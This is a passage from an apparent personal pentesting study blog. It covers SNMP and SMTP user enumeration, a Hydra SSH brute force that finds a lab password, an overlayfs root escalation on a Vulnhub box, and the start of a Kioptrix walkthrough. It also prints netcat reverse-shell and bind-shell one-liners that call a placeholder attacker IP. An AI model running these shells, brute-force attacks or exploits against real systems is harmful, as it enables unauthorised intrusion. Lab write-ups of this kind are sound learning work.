class="line">iso.3.6.1.2.1.1.9.1.3.9 &#x3D; STRING: &quot;The MIB modules for managing SNMP Notification, plus filtering.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.10 &#x3D; STRING: &quot;The MIB module for logging SNMP Notifications.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.1 &#x3D; Timeticks: (2) 0:00:00.02</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.2 &#x3D; Timeticks: (2) 0:00:00.02</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.3 &#x3D; Timeticks: (2) 0:00:00.02</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.4 &#x3D; Timeticks: (2) 0:00:00.02</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.5 &#x3D; Timeticks: (2) 0:00:00.02</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.6 &#x3D; Timeticks: (2) 0:00:00.02</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.7 &#x3D; Timeticks: (2) 0:00:00.02</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.8 &#x3D; Timeticks: (2) 0:00:00.02</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.9 &#x3D; Timeticks: (2) 0:00:00.02</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.10 &#x3D; Timeticks: (3) 0:00:00.03</span><br><span class="line">iso.3.6.1.2.1.25.1.1.0 &#x3D; Timeticks: (260776) 0:43:27.76</span><br><span class="line">iso.3.6.1.2.1.25.1.2.0 &#x3D; Hex-STRING: 07 E5 03 0B 03 06 14 00 2B 00 00 </span><br><span class="line">iso.3.6.1.2.1.25.1.3.0 &#x3D; INTEGER: 393216</span><br><span class="line">iso.3.6.1.2.1.25.1.4.0 &#x3D; STRING: &quot;BOOT_IMAGE&#x3D;&#x2F;vmlinuz-3.19.0-25-generic root&#x3D;&#x2F;dev&#x2F;mapper&#x2F;analoguepond--vg-root ro</span><br><span class="line">&quot;</span><br><span class="line">iso.3.6.1.2.1.25.1.5.0 &#x3D; Gauge32: 0</span><br><span class="line">iso.3.6.1.2.1.25.1.6.0 &#x3D; Gauge32: 25</span><br><span class="line">iso.3.6.1.2.1.25.1.7.0 &#x3D; INTEGER: 0</span><br><span class="line">iso.3.6.1.2.1.25.1.7.0 &#x3D; No more variables left in this MIB View (It is past the end of the MIB tree)</span><br></pre></td></tr></table></figure>
<p>-v 1|2c|3             specifies SNMP version to use<br>-c COMMUNITY          set the community string<br><code>eric</code> could be the user name<br><code>There is a house in New Orleans they call it..</code>, google it, its a lyric:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">There is a house in New Orleans</span><br><span class="line">They call the Rising Sun,</span><br></pre></td></tr></table></figure>
<p>suppose it’s the password, try it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">therisingsun</span><br><span class="line">risingsun</span><br><span class="line">rising sun</span><br><span class="line">the rising sun</span><br><span class="line">houseoftherisingsun</span><br><span class="line">house of the rising sun</span><br></pre></td></tr></table></figure>
<p>Use John to generate password candidates</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john - a tool to find weak passwords of your users</span><br><span class="line">john --wordlist&#x3D;passlist --rules --stdout &gt; passcandi</span><br></pre></td></tr></table></figure>
<p>–rules[=SECTION[,..]]     enable word mangling rules<br>–stdout[=LENGTH]          just output candidate passwords [cut at LENGTH]<br>output candidates to file  </p>
<p>then use hydra to crack</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ hydra -P passcandi -l eric 192.168.119.133 ssh                                                           255 ⨯</span><br><span class="line">Hydra v9.1 (c) 2020 by van Hauser&#x2F;THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2021-03-10 22:24:48</span><br><span class="line">[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 156 login tries (l:1&#x2F;p:156), ~10 tries per task</span><br><span class="line">[DATA] attacking ssh:&#x2F;&#x2F;192.168.119.133:22&#x2F;</span><br><span class="line">[22][ssh] host: 192.168.119.133   login: eric   password: therisingsun</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">[WARNING] Writing restore file because 2 final worker threads did not complete until end.</span><br><span class="line">[ERROR] 2 targets did not resolve or could not be connected</span><br><span class="line">[ERROR] 0 target did not complete</span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2021-03-10 22:24:51</span><br></pre></td></tr></table></figure>
<p>-l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE<br>-p PASS  or -P FILE  try password PASS, or load several passwords from FILE  </p>
<p>find password: <code>therisingsun</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh eric@192.168.119.133</span><br><span class="line">eric@analoguepond:~$ sudo -v</span><br><span class="line">sudo: unable to resolve host analoguepond</span><br><span class="line">Sorry, user eric may not run sudo on analoguepond.</span><br></pre></td></tr></table></figure>
<p>not a sudo user</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">eric@analoguepond:~$ uname -a</span><br><span class="line">Linux analoguepond 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br><span class="line"></span><br><span class="line">searchsploit ubuntu 14.04</span><br><span class="line">found:</span><br><span class="line">&#39;overlayfs&#39; Local Privilege Escalation </span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39166">https://www.exploit-db.com/exploits/39166</a>  </p>
<p>get the root access  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@analoguepond:~# cd &#x2F;root&#x2F;</span><br><span class="line">root@analoguepond:&#x2F;root# ls</span><br><span class="line">flag.txt</span><br><span class="line">root@analoguepond:&#x2F;root# cat flag.txt </span><br><span class="line">C&#39;Mon Man! Y&#39;all didn&#39;t think this was the final flag so soon...?</span><br><span class="line"></span><br><span class="line">Did the bright lights and big city knock you out...? If you pull</span><br><span class="line">a stunt like this again, I&#39;ll send you back to Walker...</span><br><span class="line"></span><br><span class="line">This is obviously troll flah #1 So keep going.</span><br><span class="line"></span><br><span class="line">root@analoguepond:&#x2F;root# netstat -nplt</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name</span><br><span class="line">tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      1231&#x2F;dnsmasq    </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      918&#x2F;sshd        </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      918&#x2F;sshd    </span><br><span class="line"></span><br><span class="line">netstat  -  Print network connections, routing tables, interface</span><br><span class="line">       statistics, masquerade connections, and multicast memberships</span><br></pre></td></tr></table></figure>
<p>-n, –numeric            don’t resolve names<br>-p, –programs           display PID/Program name for sockets<br>-l, –listening          display listening server sockets<br>{-t|–tcp} {-u|–udp} {-w|–raw} {-x|–unix}   </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">virbr0    Link encap:Ethernet  HWaddr 52:54:00:b2:23:25  </span><br><span class="line">          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>could use the pingsweep.sh script on victim machine  </p>
<p>there’s something else, but lets end here, since my aim is to learn snmp…  </p>
<h2 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">telnet 192.169.119.129 25</span><br><span class="line">220 metasploitable.localdomain ESMTP Postfix (Ubuntu)</span><br><span class="line"></span><br><span class="line">rfy admin@metasploitable.localdomain</span><br><span class="line">550 5.1.1 &lt;admin@metasploitable.localdomain&gt;: Recipient address rejected: User unknown in local recipient table</span><br><span class="line">vrfy msfadmin@metasploitable.localdomain</span><br><span class="line">252 2.0.0 msfadmin@metasploitable.localdomain</span><br></pre></td></tr></table></figure>
<p>check if user exist</p>
<h3 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit:"></a>Metasploit:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use scanner&#x2F;smtp&#x2F;smtp_enum</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line">  The SMTP service has two internal commands that allow the </span><br><span class="line">  enumeration of users: VRFY (confirming the names of valid users) and </span><br><span class="line">  EXPN (which reveals the actual address of users aliases and lists of </span><br><span class="line">  e-mail (mailing lists)). Through the implementation of these SMTP </span><br><span class="line">  commands can reveal a list of valid users.</span><br><span class="line"></span><br><span class="line">[+] 192.168.119.129:25    - 192.168.119.129:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, postfix, postgres, postmaster, proxy, service, sshd, sync, sys,</span><br></pre></td></tr></table></figure>

<h3 id="Use-smtp-user-enum"><a href="#Use-smtp-user-enum" class="headerlink" title="Use smtp-user-enum"></a>Use smtp-user-enum</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">└─$ &#x2F;usr&#x2F;share&#x2F;legion&#x2F;scripts&#x2F;smtp-user-enum.pl -M VRFY -U &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;metasploit&#x2F;unix_users.txt -t 192.168.119.129</span><br><span class="line">Starting smtp-user-enum v1.2 ( http:&#x2F;&#x2F;pentestmonkey.net&#x2F;tools&#x2F;smtp-user-enum )</span><br><span class="line"></span><br><span class="line"> ----------------------------------------------------------</span><br><span class="line">|                   Scan Information                       |</span><br><span class="line"> ----------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Mode ..................... VRFY</span><br><span class="line">Worker Processes ......... 5</span><br><span class="line">Usernames file ........... &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;metasploit&#x2F;unix_users.txt</span><br><span class="line">Target count ............. 1</span><br><span class="line">Username count ........... 168</span><br><span class="line">Target TCP port .......... 25</span><br><span class="line">Query timeout ............ 5 secs</span><br><span class="line">Target domain ............ </span><br><span class="line"></span><br><span class="line">######## Scan started at Wed Mar 10 21:16:31 2021 #########</span><br><span class="line">192.168.119.129: backup exists</span><br><span class="line">192.168.119.129: bin exists</span><br><span class="line">192.168.119.129: daemon exists</span><br><span class="line">192.168.119.129: distccd exists</span><br><span class="line">192.168.119.129: ftp exists</span><br><span class="line">192.168.119.129: games exists</span><br><span class="line">192.168.119.129: gnats exists</span><br><span class="line">192.168.119.129: irc exists</span><br><span class="line">192.168.119.129: libuuid exists</span><br><span class="line">192.168.119.129: list exists</span><br><span class="line">192.168.119.129: lp exists</span><br><span class="line">192.168.119.129: mail exists</span><br><span class="line">192.168.119.129: man exists</span><br><span class="line">192.168.119.129: mysql exists</span><br><span class="line">192.168.119.129: news exists</span><br><span class="line">192.168.119.129: nobody exists</span><br><span class="line">192.168.119.129: postfix exists</span><br><span class="line">192.168.119.129: postgres exists</span><br><span class="line">192.168.119.129: postmaster exists</span><br><span class="line">192.168.119.129: proxy exists</span><br><span class="line">192.168.119.129: root exists</span><br><span class="line">192.168.119.129: ROOT exists</span><br><span class="line">192.168.119.129: service exists</span><br><span class="line">192.168.119.129: sshd exists</span><br><span class="line">192.168.119.129: sync exists</span><br><span class="line">192.168.119.129: sys exists</span><br><span class="line">192.168.119.129: syslog exists</span><br><span class="line">192.168.119.129: user exists</span><br><span class="line">192.168.119.129: uucp exists</span><br><span class="line">192.168.119.129: www-data exists</span><br><span class="line">######## Scan completed at Wed Mar 10 21:16:32 2021 #########</span><br><span class="line">30 results.</span><br><span class="line"></span><br><span class="line">168 queries in 1 seconds (168.0 queries &#x2F; sec)</span><br></pre></td></tr></table></figure>
<p>add -D metasploitable.localdomain to guess valid email address instead of user name</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">192.168.119.129: mysql@metasploitable.localdomain exists</span><br><span class="line">192.168.119.129: news@metasploitable.localdomain exists</span><br><span class="line">192.168.119.129: nobody@metasploitable.localdomain exists</span><br><span class="line">192.168.119.129: postfix@metasploitable.localdomain exists</span><br></pre></td></tr></table></figure>


<h1 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 192.168.0.22 80</span><br></pre></td></tr></table></figure>
<p>-n           numeric-only IP addresses, no DNS<br>-v           verbose [use twice to be more verbose]  </p>
<p>if victim execute this, it will connect to attacker’s listening nc, and provide shell to him</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv attackerIP port -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<h2 id="Listening"><a href="#Listening" class="headerlink" title="Listening"></a>Listening</h2><p>Victim listening on port, whoever connect to it will gain the shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444 -e &#x2F;usr&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p>-l listening<br>-p port<br>-e filename             program to exec after connect [dangerous!!]  </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/08/Kioptrix-Level-1-Walkthrough/">Kioptrix Level 1 Walkthrough</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-08</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/WalkThrough/">WalkThrough</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Vulnhub/">Vulnhub</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Find-IP-Address-of-target-Box"><a href="#Find-IP-Address-of-target-Box" class="headerlink" title="Find IP Address of target Box"></a>Find IP Address of target Box</h1><h2 id="check-current-interface"><a href="#check-current-interface" class="headerlink" title="check current interface:"></a>check current interface:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">─# ifconfig                                                     </span><br><span class="line">eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.119.130  netmask 255.255.255.0  broadcast 192.168.119.255</span><br><span class="line">        inet6 fe80::20c:29ff:fec4:f034  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:c4:f0:34  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 184146  bytes 51512617 (49.1 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 167933  bytes 11553532 (11.0 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>interface is <code>eth0</code></p>
<h2 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h2><p>Using ARP messages to discover hosts</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 </span><br></pre></td></tr></table></figure>
<p>-i device: your network device (interface)  </p>
<p><img src="/images/kioptrix1_netdiscover.png" alt="image" title="screenshot of netdiscover"></p>
<p>So the target IP address is <code>192.168.119.254</code></p>
<h1 id="Port-Scan"><a href="#Port-Scan" class="headerlink" title="Port Scan"></a>Port Scan</h1><h2 id="first-Scan"><a href="#first-Scan" class="headerlink" title="first Scan"></a>first Scan</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sS --stats-every 3m --max-scan-delay 20 --max-retries 1 --defeat-rst-ratelimit -p1-65535 -oN ~&#x2F;kiotrix1.txt 192.168.119.254</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">--max-scan-delay to avoid following ICMP package get lost  </span><br><span class="line"></span><br><span class="line">      --defeat-rst-ratelimit</span><br><span class="line">           Many hosts have long used rate limiting to reduce the number of ICMP error messages (such as</span><br><span class="line">           port-unreachable errors) they send. Some systems now apply similar rate limits to the RST (reset)</span><br><span class="line">           packets they generate. This can slow Nmap down dramatically as it adjusts its timing to reflect those</span><br><span class="line">           rate limits. You can tell Nmap to ignore those rate limits (for port scans such as SYN scan which don&#39;t</span><br><span class="line">           treat non-responsive ports as open) by specifying --defeat-rst-ratelimit.</span><br><span class="line"></span><br><span class="line">           Using this option can reduce accuracy, as some ports will appear non-responsive because Nmap didn&#39;t</span><br><span class="line">           wait long enough for a rate-limited RST response. With a SYN scan, the non-response results in the port</span><br><span class="line">           being labeled filtered rather than the closed state we see when RST packets are received. This option</span><br><span class="line">           is useful when you only care about open ports, and distinguishing between closed and filtered ports</span><br><span class="line">           isn&#39;t worth the extra time.</span><br></pre></td></tr></table></figure>
<p>The port identifiers are unsigned 16-bit integers, meaning that the largest number you can put in there is 2^16-1 = 65535</p>
<p>Get error: <code>All 65535 scanned ports on 192.168.119.254 are filtered</code></p>
<h2 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h2><p>192.168.119.254 is not the IP address of Kioptrix box. I encounter a problem that Kioptrix can not be set use NAT or Host only mode. It will automatically switch to Bridged(Automatic) when launching. So weird. Link: <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/66538382/network-setting-automatically-switched-to-bridged-in-vmware-player">network setting automatically switched to Bridged in VMWare Player</a></p>
<p>I will stick with briged mode for now, it is not safe btw.</p>
<p>So the IP address of target Box is <code>192.168.0.22</code></p>
<h2 id="First-Scan-continue"><a href="#First-Scan-continue" class="headerlink" title="First Scan continue"></a>First Scan continue</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">map -sS -n -Pn -p- -T4 192.168.0.22 </span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22&#x2F;tcp   open  ssh</span><br><span class="line">80&#x2F;tcp   open  http</span><br><span class="line">111&#x2F;tcp  open  rpcbind</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn</span><br><span class="line">443&#x2F;tcp  open  https</span><br><span class="line">1024&#x2F;tcp open  kdm</span><br></pre></td></tr></table></figure>


<h2 id="Second-Scan"><a href="#Second-Scan" class="headerlink" title="Second Scan"></a>Second Scan</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -nvv -sSV -p 22,80,111,139,443,1024 --version-intensity 9 -A -oN 192.168.0.22</span><br></pre></td></tr></table></figure>
<p>-n/-R: Never do DNS resolution/Always resolve [default: sometimes]<br>–version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)<br>-sSV is a combine of sS and sV, sV service and version detection</p>
<h2 id="Some-Notes"><a href="#Some-Notes" class="headerlink" title="Some Notes"></a>Some Notes</h2><p>interesint 80, 443 for webserver, tcp 139 samba </p>
<p>SMB a communication protocal for providing shared access to files, printers, and serial ports between nodes on a network</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.33</span><br></pre></td></tr></table></figure>

<h2 id="UDP-Scan"><a href="#UDP-Scan" class="headerlink" title="UDP Scan"></a>UDP Scan</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --top-ports 1000 -sU -Pn --stats-every 3m --max-retries 1 -T3 192.168.0.22</span><br></pre></td></tr></table></figure>

<h1 id="SSH-enumeration"><a href="#SSH-enumeration" class="headerlink" title="SSH enumeration"></a>SSH enumeration</h1><p>openssh version: <code>OpenSSH 2.9p2</code><br>Google it, find some CVE’s with Exec Code Overflow <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2002-0640/">CVE-2002-0640</a><br>need OS to <code>when OpenBSD is using PAM modules with interactive keyboard authentication (PAMAuthenticationViaKbdInt).</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit openssh</span><br></pre></td></tr></table></figure>

<p>Try directly connect to it:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssh 192.168.0.22    </span><br><span class="line">Unable to negotiate with 192.168.0.22 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1</span><br><span class="line"></span><br><span class="line"># so use one of the exchange method and try again</span><br><span class="line">ssh -oKexAlgorithms&#x3D;+diffie-hellman-group1-sha1 192.168.0.22 </span><br><span class="line"></span><br><span class="line">Unable to negotiate with 192.168.0.22 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc,rijndael128-cbc,rijndael192-cbc,rijndael256-cbc,rijndael-cbc@lysator.liu.se</span><br><span class="line"></span><br><span class="line"># then add the cipher</span><br><span class="line">ssh -c aes128-cbc -oKexAlgorithms&#x3D;+diffie-hellman-group1-sha1 192.168.0.22 </span><br><span class="line">root@192.168.0.22&#39;s password: </span><br></pre></td></tr></table></figure>
<p>Last resort for passwork attack, easy be detected, if theres a log<br>Usually SSH is not your first thing to try</p>
<h2 id="HTTP-Enumeration"><a href="#HTTP-Enumeration" class="headerlink" title="HTTP Enumeration"></a>HTTP Enumeration</h2><p>port 80 and 443</p>
<ul>
<li>go to their web page through web broser</li>
<li>view the source code</li>
<li>check out https://</li>
</ul>
<h3 id="Directory-Scan"><a href="#Directory-Scan" class="headerlink" title="Directory Scan"></a>Directory Scan</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirbuster</span><br></pre></td></tr></table></figure>
<p>some wordlist stored in <code>/usr/share/wordlists/dirbuster</code><br>Also download some big wordlist, google <code>dirbuster wordlist</code><br>I actually not found through google, its in githubrepo <a target="_blank" rel="noopener" href="https://github.com/digination/dirbuster-ng">https://github.com/digination/dirbuster-ng</a></p>
<p>remove <code>manual</code> from the wordlist, there are many php manual page, waste of time, but let me try<br><img src="/images/kioptrix1_dirbuster.png" alt="image" title="screenshot of dirbuster"></p>
<p>nothing interesting</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h 192.168.0.22</span><br></pre></td></tr></table></figure>
<p>-h -host</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.0.22</span><br><span class="line">+ Target Hostname:    192.168.0.22</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2021-03-09 21:53:34 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache&#x2F;1.3.20 (Unix)  (Red-Hat&#x2F;Linux) mod_ssl&#x2F;2.8.4 OpenSSL&#x2F;0.9.6b</span><br><span class="line">+ Server may leak inodes via ETags, header found with file &#x2F;, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ OpenSSL&#x2F;0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.</span><br><span class="line">+ 